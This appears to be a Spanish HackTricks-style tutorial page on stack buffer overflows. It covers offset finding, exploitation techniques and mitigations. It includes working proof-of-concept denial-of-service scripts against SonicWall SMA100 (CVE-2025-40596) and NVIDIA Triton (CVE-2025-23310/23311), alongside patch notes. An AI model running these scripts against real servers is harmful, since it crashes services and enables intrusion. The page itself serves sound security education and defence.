# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es un Stack Overflow

Un **stack overflow** es una vulnerabilidad que ocurre cuando un programa escribe más datos en la stack de los que se le han asignado para almacenar. Este exceso de datos **sobrescribirá el espacio de memoria adyacente**, provocando la corrupción de datos válidos, la alteración del flujo de control y, potencialmente, la ejecución de código malicioso. Este problema suele surgir por el uso de funciones inseguras que no realizan comprobaciones de límites sobre la entrada.

El problema principal de esta sobrescritura es que el **saved instruction pointer (EIP/RIP)** y el **saved base pointer (EBP/RBP)** para regresar a la función anterior están **almacenados en la stack**. Por lo tanto, un atacante podrá sobrescribirlos y **controlar el flujo de ejecución del programa**.

La vulnerabilidad suele aparecer porque una función **copia en la stack más bytes de los que tiene asignados**, pudiendo así sobrescribir otras partes de la stack.

Algunas funciones comunes vulnerables a esto son: **`strcpy`, `strcat`, `sprintf`, `gets`**... Además, funciones como **`fgets`**, **`read`** y **`memcpy`** que toman un **argumento de longitud**, podrían usarse de forma vulnerable si la longitud especificada es mayor que la asignada.

Por ejemplo, las siguientes funciones podrían ser vulnerables:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Finding Stack Overflows offsets

La forma más común de encontrar Stack Overflows es dar una entrada muy grande de `A`s (e.g. `python3 -c 'print("A"*1000)'`) y esperar un `Segmentation Fault` que indica que se intentó acceder a la **address `0x41414141`**.

Además, una vez que confirmaste que hay una Stack Overflow vulnerability necesitarás encontrar el offset hasta que sea posible **overwrite the return address**, para esto suele usarse una **De Bruijn sequence.** La cual, para un alfabeto de tamaño _k_ y subsecuencias de longitud _n_, es una **cyclic sequence in which every possible subsequence of length _n_ appears exactly once** como subsecuencia contigua.

De este modo, en lugar de necesitar averiguar a mano qué offset hace falta para controlar el EIP, es posible usar como padding una de estas secuencias y luego encontrar el offset de los bytes que terminaron sobrescribiéndola.

Es posible usar **pwntools** para esto:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
o **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Explotando Stack Overflows

Durante un overflow (suponiendo que el tamaño del overflow sea lo bastante grande) podrás **sobrescribir** valores de variables locales dentro del stack hasta alcanzar el **EBP/RBP and EIP/RIP (or even more)**.\
La forma más común de abusar de este tipo de vulnerabilidad es **modificando la dirección de retorno** de modo que cuando la función termine el **flujo de control se redirigirá hacia donde el usuario especificó** en ese puntero.

Sin embargo, en otros escenarios quizá con solo **sobrescribir algunos valores de variables en el stack** sea suficiente para la explotación (como en CTFs sencillos).

### Ret2win

En este tipo de retos CTF, hay una **función** **dentro** del binario que **nunca se llama** y que **necesitas invocar para ganar**. Para estos retos solo necesitas encontrar el **offset para sobrescribir la dirección de retorno** y **la dirección de la función** a llamar (usualmente [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) estará deshabilitado) de modo que cuando la función vulnerable retorne, se llame a la función oculta:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

En este escenario el atacante puede colocar un shellcode en el stack y aprovechar el EIP/RIP controlado para saltar al shellcode y ejecutar código arbitrario:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

En Windows de 32 bits, un overflow puede sobrescribir la cadena del Structured Exception Handler (SEH) en lugar de la dirección de retorno guardada. La explotación típicamente reemplaza el puntero SEH con un gadget POP POP RET y usa el campo nSEH de 4 bytes para un salto corto que pivotea de vuelta al gran buffer donde vive el shellcode. Un patrón común es un short jmp en nSEH que aterriza en un near jmp de 5 bytes colocado justo antes de nSEH para saltar cientos de bytes hacia el inicio del payload.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Esta técnica es el marco fundamental para eludir la principal protección frente a la técnica anterior: **No executable stack (NX)**. Además permite realizar varias otras técnicas (ret2lib, ret2syscall...) que acabarán ejecutando comandos arbitrarios aprovechando instrucciones existentes en el binario:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Un overflow no siempre estará en el stack; también podría estar en el **heap**, por ejemplo:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Tipos de protecciones

Existen varias protecciones que intentan prevenir la explotación de vulnerabilidades; revísalas en:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Una buena demostración de por qué **`sscanf` nunca debe usarse para analizar entrada no confiable** apareció en 2025 en el appliance SSL-VPN SMA100 de SonicWall.
La rutina vulnerable dentro de `/usr/src/EasyAccess/bin/httpd` intenta extraer la versión y el endpoint de cualquier URI que comience con `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. La primera conversión (`%2s`) almacena de forma segura **dos** bytes en `version` (p. ej. `"v1"`).
2. La segunda conversión (`%s`) **no tiene especificador de longitud**, por lo tanto `sscanf` seguirá copiando **hasta el primer NUL byte**.
3. Debido a que `endpoint` está ubicado en la **stack** y tiene **0x800 bytes de longitud**, proporcionar una ruta más larga que 0x800 bytes corrompe todo lo que sigue después del buffer ‑ incluyendo el **stack canary** y la **saved return address**.

Una prueba de concepto de una sola línea es suficiente para provocar el crash **antes de la autenticación**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Aunque stack canaries abortan el proceso, un atacante aún obtiene un primitivo de **Denial-of-Service** (y, con leaks de información adicionales, posiblemente code-execution). La lección es simple:

* Siempre proporcione un **ancho máximo de campo** (p. ej. `%511s`).
* Prefiera alternativas más seguras como `snprintf`/`strncpy_s`.

### Ejemplo del mundo real: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

Triton Inference Server de NVIDIA (≤ v25.06) contenía múltiples **stack-based overflows** accesibles a través de su HTTP API.
El patrón vulnerable apareció repetidamente en `http_server.cc` y `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) devuelve el **número de segmentos de buffer internos** que componen el cuerpo de la petición HTTP actual.
2. Cada segmento provoca que se asigne un `evbuffer_iovec` de **16 bytes** en la **stack** vía `alloca()` – **sin ningún límite superior**.
3. Al abusar de **HTTP _chunked transfer-encoding_**, un cliente puede forzar que la petición se divida en **cientos de miles de fragmentos de 6 bytes** (`"1\r\nA\r\n"`). Esto hace que `n` crezca sin límite hasta que la stack se agote.

#### Prueba de concepto (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Una solicitud de ~3 MB es suficiente para sobrescribir la dirección de retorno guardada y **crash** el daemon en un build por defecto.

#### Parche & Mitigación
La versión 25.07 reemplaza la asignación insegura en la pila por un **heap-backed `std::vector`** y gestiona `std::bad_alloc` correctamente:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Lecciones aprendidas:
* Nunca llames a `alloca()` con tamaños controlados por el atacante.
* Las Chunked requests pueden cambiar drásticamente la forma de los buffers del lado del servidor.
* Valida / limita cualquier valor derivado de la entrada del cliente *antes* de usarlo en las asignaciones de memoria.

## Referencias
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
